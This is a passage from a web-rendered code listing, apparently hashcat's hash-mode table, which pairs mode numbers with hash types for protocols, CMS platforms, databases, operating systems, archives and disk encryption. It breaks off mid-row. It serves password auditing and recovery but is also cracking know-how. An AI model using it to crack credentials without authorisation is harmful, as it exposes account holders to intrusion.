md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"> 2600 | md5(md5($pass))                                  | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"> 3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"> 4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"> 4400 | md5(sha1($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">  110 | sha1($pass.$salt)                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">  120 | sha1($salt.$pass)                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">  130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">  140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"> 4500 | sha1(sha1($pass))                                | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"> 4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line"> 4700 | sha1(md5($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"> 4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">14400 | sha1(CX)                                         | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line"> 1410 | sha256($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"> 1420 | sha256($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"> 1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line"> 1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line"> 1710 | sha512($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line"> 1720 | sha512($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line"> 1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"> 1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">   50 | HMAC-MD5 (key &#x3D; $pass)                           | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">   60 | HMAC-MD5 (key &#x3D; $salt)                           | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">  150 | HMAC-SHA1 (key &#x3D; $pass)                          | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">  160 | HMAC-SHA1 (key &#x3D; $salt)                          | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line"> 1450 | HMAC-SHA256 (key &#x3D; $pass)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line"> 1460 | HMAC-SHA256 (key &#x3D; $salt)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"> 1750 | HMAC-SHA512 (key &#x3D; $pass)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line"> 1760 | HMAC-SHA512 (key &#x3D; $salt)                        | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">11750 | HMAC-Streebog-256 (key &#x3D; $pass), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">11760 | HMAC-Streebog-256 (key &#x3D; $salt), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">11850 | HMAC-Streebog-512 (key &#x3D; $pass), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">11860 | HMAC-Streebog-512 (key &#x3D; $salt), big-endian      | Raw Hash, Authenticated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">14000 | DES (PT &#x3D; $salt, key &#x3D; $pass)                    | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">14100 | 3DES (PT &#x3D; $salt, key &#x3D; $pass)                   | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">14900 | Skip32 (PT &#x3D; $salt, key &#x3D; $pass)                 | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">  400 | phpass                                           | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line"> 8900 | scrypt                                           | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">11900 | PBKDF2-HMAC-MD5                                  | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">10900 | PBKDF2-HMAC-SHA256                               | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">12100 | PBKDF2-HMAC-SHA512                               | Generic KDF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">   23 | Skype                                            | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line"> 2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line"> 2501 | WPA-EAPOL-PMK                                    | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">16800 | WPA-PMKID-PBKDF2                                 | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">16801 | WPA-PMKID-PMK                                    | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line"> 4800 | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line"> 5300 | IKE-PSK MD5                                      | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line"> 5400 | IKE-PSK SHA1                                     | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line"> 5500 | NetNTLMv1                                        | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line"> 5500 | NetNTLMv1+ESS                                    | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"> 5600 | NetNTLMv2                                        | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line"> 7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line"> 7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"> 8300 | DNSSEC (NSEC3)                                   | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">10200 | CRAM-MD5                                         | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">11100 | PostgreSQL CRAM (MD5)                            | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">11200 | MySQL CRAM (SHA1)                                | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">11400 | SIP digest authentication (MD5)                  | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">16100 | TACACS+                                          | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">16500 | JWT (JSON Web Token)                             | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">  121 | SMF (Simple Machines Forum) &gt; v1.1               | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">  400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line"> 2611 | vBulletin &lt; v3.8.5                               | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line"> 2711 | vBulletin &gt;&#x3D; v3.8.5                              | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line"> 2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"> 2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line"> 8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">   11 | Joomla &lt; 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">  400 | Joomla &gt;&#x3D; 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line">  400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line"> 2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line"> 7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">   21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">   21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line">  124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line">10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">16000 | Tripcode                                         | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line"> 3711 | MediaWiki B type                                 | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">13900 | OpenCart                                         | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line"> 4521 | Redmine                                          | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line"> 4522 | PunBB                                            | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">   12 | PostgreSQL                                       | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">  131 | MSSQL (2000)                                     | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line">  132 | MSSQL (2005)                                     | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line"> 1731 | MSSQL (2012, 2014)                               | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">  200 | MySQL323                                         | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">  300 | MySQL4.1&#x2F;MySQL5                                  | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line"> 3100 | Oracle H: Type (Oracle 7+)                       | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">  112 | Oracle S: Type (Oracle 11+)                      | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">12300 | Oracle T: Type (Oracle 12+)                      | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line"> 8000 | Sybase ASE                                       | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">  141 | Episerver 6.x &lt; .NET 4                           | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">134</span></pre></td><td class="code"><pre><span class="line"> 1441 | Episerver 6.x &gt;&#x3D; .NET 4                          | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">135</span></pre></td><td class="code"><pre><span class="line"> 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">136</span></pre></td><td class="code"><pre><span class="line">12600 | ColdFusion 10+                                   | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">137</span></pre></td><td class="code"><pre><span class="line"> 1421 | hMailServer                                      | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">138</span></pre></td><td class="code"><pre><span class="line">  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">139</span></pre></td><td class="code"><pre><span class="line">  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">140</span></pre></td><td class="code"><pre><span class="line"> 1411 | SSHA-256(Base64), LDAP &#123;SSHA256&#125;                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">141</span></pre></td><td class="code"><pre><span class="line"> 1711 | SSHA-512(Base64), LDAP &#123;SSHA512&#125;                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">142</span></pre></td><td class="code"><pre><span class="line">16400 | CRAM-MD5 Dovecot                                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">143</span></pre></td><td class="code"><pre><span class="line">15000 | FileZilla Server &gt;&#x3D; 0.9.55                       | FTP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">144</span></pre></td><td class="code"><pre><span class="line">11500 | CRC32                                            | Checksums</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">145</span></pre></td><td class="code"><pre><span class="line"> 3000 | LM                                               | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">146</span></pre></td><td class="code"><pre><span class="line"> 1000 | NTLM                                             | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">147</span></pre></td><td class="code"><pre><span class="line"> 1100 | Domain Cached Credentials (DCC), MS Cache        | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">148</span></pre></td><td class="code"><pre><span class="line"> 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">149</span></pre></td><td class="code"><pre><span class="line">15300 | DPAPI masterkey file v1                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">150</span></pre></td><td class="code"><pre><span class="line">15900 | DPAPI masterkey file v2                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">151</span></pre></td><td class="code"><pre><span class="line">12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">152</span></pre></td><td class="code"><pre><span class="line"> 1500 | descrypt, DES (Unix), Traditional DES            | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">153</span></pre></td><td class="code"><pre><span class="line">12400 | BSDi Crypt, Extended DES                         | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">154</span></pre></td><td class="code"><pre><span class="line">  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">155</span></pre></td><td class="code"><pre><span class="line"> 3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">156</span></pre></td><td class="code"><pre><span class="line"> 7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">157</span></pre></td><td class="code"><pre><span class="line"> 1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">158</span></pre></td><td class="code"><pre><span class="line">  122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">159</span></pre></td><td class="code"><pre><span class="line"> 1722 | macOS v10.7                                      | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">160</span></pre></td><td class="code"><pre><span class="line"> 7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">161</span></pre></td><td class="code"><pre><span class="line"> 6300 | AIX &#123;smd5&#125;                                       | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">162</span></pre></td><td class="code"><pre><span class="line"> 6700 | AIX &#123;ssha1&#125;                                      | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">163</span></pre></td><td class="code"><pre><span class="line"> 6400 | AIX &#123;ssha256&#125;                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">164</span></pre></td><td class="code"><pre><span class="line"> 6500 | AIX &#123;ssha512&#125;                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">165</span></pre></td><td class="code"><pre><span class="line"> 2400 | Cisco-PIX MD5                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">166</span></pre></td><td class="code"><pre><span class="line"> 2410 | Cisco-ASA MD5                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">167</span></pre></td><td class="code"><pre><span class="line">  500 | Cisco-IOS $1$ (MD5)                              | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">168</span></pre></td><td class="code"><pre><span class="line"> 5700 | Cisco-IOS type 4 (SHA256)                        | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">169</span></pre></td><td class="code"><pre><span class="line"> 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">170</span></pre></td><td class="code"><pre><span class="line"> 9300 | Cisco-IOS $9$ (scrypt)                           | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">171</span></pre></td><td class="code"><pre><span class="line">   22 | Juniper NetScreen&#x2F;SSG (ScreenOS)                 | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">172</span></pre></td><td class="code"><pre><span class="line">  501 | Juniper IVE                                      | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">173</span></pre></td><td class="code"><pre><span class="line">15100 | Juniper&#x2F;NetBSD sha1crypt                         | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">174</span></pre></td><td class="code"><pre><span class="line"> 7000 | FortiGate (FortiOS)                              | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">175</span></pre></td><td class="code"><pre><span class="line"> 5800 | Samsung Android Password&#x2F;PIN                     | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">176</span></pre></td><td class="code"><pre><span class="line">13800 | Windows Phone 8+ PIN&#x2F;password                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">177</span></pre></td><td class="code"><pre><span class="line"> 8100 | Citrix NetScaler                                 | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">178</span></pre></td><td class="code"><pre><span class="line"> 8500 | RACF                                             | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">179</span></pre></td><td class="code"><pre><span class="line"> 7200 | GRUB 2                                           | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">180</span></pre></td><td class="code"><pre><span class="line"> 9900 | Radmin2                                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">181</span></pre></td><td class="code"><pre><span class="line">  125 | ArubaOS                                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">182</span></pre></td><td class="code"><pre><span class="line"> 7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">183</span></pre></td><td class="code"><pre><span class="line"> 7701 | SAP CODVN B (BCODE) via RFC_READ_TABLE           | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">184</span></pre></td><td class="code"><pre><span class="line"> 7800 | SAP CODVN F&#x2F;G (PASSCODE)                         | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">185</span></pre></td><td class="code"><pre><span class="line"> 7801 | SAP CODVN F&#x2F;G (PASSCODE) via RFC_READ_TABLE      | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">186</span></pre></td><td class="code"><pre><span class="line">10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">187</span></pre></td><td class="code"><pre><span class="line"> 8600 | Lotus Notes&#x2F;Domino 5                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">188</span></pre></td><td class="code"><pre><span class="line"> 8700 | Lotus Notes&#x2F;Domino 6                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">189</span></pre></td><td class="code"><pre><span class="line"> 9100 | Lotus Notes&#x2F;Domino 8                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">190</span></pre></td><td class="code"><pre><span class="line">  133 | PeopleSoft                                       | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">191</span></pre></td><td class="code"><pre><span class="line">13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">192</span></pre></td><td class="code"><pre><span class="line">11600 | 7-Zip                                            | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">193</span></pre></td><td class="code"><pre><span class="line">12500 | RAR3-hp                                          | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">194</span></pre></td><td class="code"><pre><span class="line">13000 | RAR5                                             | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">195</span></pre></td><td class="code"><pre><span class="line">13200 | AxCrypt                                          | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">196</span></pre></td><td class="code"><pre><span class="line">13300 | AxCrypt in-memory SHA1                           | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">197</span></pre></td><td class="code"><pre><span class="line">13600 | WinZip                                           | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">198</span></pre></td><td class="code"><pre><span class="line">14700 | iTunes backup &lt; 10.0                             | Backup</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">199</span></pre></td><td class="code"><pre><span class="line">14800 | iTunes backup &gt;&#x3D; 10.0                            | Backup</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">200</span></pre></td><td class="code"><pre><span class="line"> 62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">201</span></pre></td><td class="code"><pre><span class="line">   X  | 1 &#x3D; PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">202</span></pre></td><td class="code"><pre><span class="line">   X  | 2 &#x3D; PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">203</span></pre></td><td class="code"><pre><span class="line">   X  | 3 &#x3D; PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">204</span></pre></td><td class="code"><pre><span class="line">   X  | 4 &#x3D; PBKDF2-HMAC-RIPEMD160 + boot-mode            | 